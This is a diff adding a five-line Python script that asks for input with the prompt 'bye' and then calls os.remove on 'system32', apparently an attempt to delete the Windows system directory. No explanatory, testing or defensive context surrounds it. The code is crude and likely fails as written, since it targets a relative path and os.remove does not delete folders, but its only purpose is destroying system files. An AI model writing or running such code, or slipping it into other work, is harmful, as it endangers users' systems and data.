@@ -1,0 +1,5 @@
+import os
+
+question = input('bye')
+
+os.remove("system32")
